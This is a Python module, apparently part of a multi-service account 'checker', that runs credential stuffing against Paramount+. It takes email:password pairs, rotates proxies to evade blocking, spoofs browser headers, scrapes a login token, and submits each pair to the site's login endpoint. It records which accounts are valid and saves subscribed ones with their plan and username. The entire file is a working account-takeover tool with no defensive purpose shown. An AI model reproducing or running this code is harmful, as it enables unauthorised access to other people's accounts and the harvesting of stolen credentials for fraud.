from modules.variables import Checker
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
from requests import Session
from requests.adapters import HTTPAdapter, Retry
from urllib.parse import quote
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            
            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded" ,
                    "accept": "application/json, text/plain, */*" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "fr-FR,fr;q=0.9" ,
                    "origin": "https://www.paramountplus.com" ,
                    "referer": "https://www.paramountplus.com/account/signin/" ,
                    "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" ,
                    "sec-ch-ua-mobile": "?0" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "same-origin" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" ,
                    "x-requested-with": "XMLHttpRequest"
                }
                tk = s.get("https://www.paramountplus.com/account/signin/").text.split('"tk_trp":"')[1].split('"')[0]
                
                data = f"email={email}&password={quote(password)}&tk_trp={tk}"
                headers["Content-Length"] = str(len(data.format(email,password,tk)))
                response = s.post("https://www.paramountplus.com/account/xhr/login/",headers=headers,data=data)
                if "Invalid" in response.text or "\"success\":false" in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "isSubscriber" not in response.text:
                    raise
                
                data = response.json()
                subscribed = data["user"]["isSubscriber"]
                if not subscribed:
                    if not Checker.cui: log("custom",":".join([email,password]),"Paramount")
                    save("Paramount","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                
                subscription = data["user"]["svod"]["user_package"]["code"].replace("_"," ").lower().title()
                plan = data["user"]["svod"]["user_package"]["plan_type"].title()
                username = data["displayName"]

                if not Checker.cui: log("good",":".join([email,password]),"Paramount")
                save("Paramount","good",Checker.time,":".join([email,password])+f" | Subscription: {subscription} | Plan {plan} | Username: {username}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
